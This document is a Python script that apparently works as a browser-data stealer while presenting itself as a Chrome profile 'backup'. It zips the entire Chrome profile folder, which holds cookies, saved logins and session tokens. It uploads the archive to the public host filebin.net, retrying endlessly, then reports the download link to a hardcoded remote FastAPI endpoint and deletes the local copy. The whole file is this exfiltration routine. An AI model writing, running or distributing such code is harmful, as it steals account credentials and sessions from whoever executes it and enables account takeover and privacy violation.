import os
import zipfile
import uuid
import requests
import time

# FastAPI server URL
FASTAPI_SERVER_URL = "https://4577621e-7112-49f7-b09b-5dead0003f90.deepnoteproject.com/upload"

def get_chrome_profile_path():
    """Finds the Chrome profile folder."""
    profiles_dir = os.path.expanduser('~/.config/google-chrome')
    if os.path.exists(profiles_dir):
        return profiles_dir
    else:
        print("Chrome profile directory not found.")
        return None

def zip_folder(folder_path, zip_name):
    """Zips the folder, ensuring no empty 'root' folder is included and skipping problematic files."""
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            # Skip problematic files like SingletonSocket and other special files
            files_to_zip = [f for f in files if f != 'SingletonSocket']
            for file in files_to_zip:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)  # Remove the leading folder part
                try:
                    zipf.write(file_path, arcname)
                except Exception as e:
                    print(f"Skipping file {file_path} due to error: {e}")
    print(f"Profile folder zipped successfully as {zip_name}")

def upload_file_to_filebin(file_path):
    """Uploads a file to Filebin.net with unlimited retries until it succeeds."""
    url = 'https://filebin.net/'
    attempt = 0

    while True:  # Infinite loop for retrying
        with open(file_path, 'rb') as file:
            headers = {'filename': os.path.basename(file_path), 'accept': '*/*'}
            files = {'file': file}
            response = requests.post(url, headers=headers, files=files)

            if response.status_code == 201:  # HTTP 201 Created
                data = response.json()
                if "bin" in data and "id" in data["bin"]:
                    filebin_id = data["bin"]["id"]
                    download_link = f"https://filebin.net/{filebin_id}/{os.path.basename(file_path)}"
                    print(f'File uploaded successfully! Download link: {download_link}')
                    return download_link
                else:
                    print('Failed to retrieve Filebin ID.')
            else:
                print(f'Upload attempt {attempt + 1} failed. Retrying in 5 seconds...')

        attempt += 1
        time.sleep(5)

def send_link_to_fastapi(download_link):
    """Sends the download link to the FastAPI server with unlimited retries until it succeeds."""
    attempt = 0

    while True:  # Infinite loop for retrying
        try:
            response = requests.post(FASTAPI_SERVER_URL, json={"link": download_link})
            if response.status_code == 200:
                print(f"Link successfully sent to FastAPI: {download_link}")
                return
            else:
                print(f"Failed to send link (Attempt {attempt + 1}). Retrying in 5 seconds...")
        except requests.RequestException as e:
            print(f"Network error: {e}. Retrying in 5 seconds...")

        attempt += 1
        time.sleep(5)

if __name__ == '__main__':
    # Get Chrome profile path
    chrome_profile_path = get_chrome_profile_path()

    if chrome_profile_path:
        # Generate a random zip file name
        random_zip_name = f'chrome_profile_backup_{uuid.uuid4().hex[:8]}.zip'

        # Zip the profile folder
        zip_folder(chrome_profile_path, random_zip_name)

        # Upload the zip file to Filebin.net (unlimited retries)
        download_link = upload_file_to_filebin(random_zip_name)

        if download_link:
            # Send the download link to FastAPI (unlimited retries)
            send_link_to_fastapi(download_link)

        # Remove the zip file after uploading
        os.remove(random_zip_name)
        print(f"Zip file '{random_zip_name}' deleted successfully.")
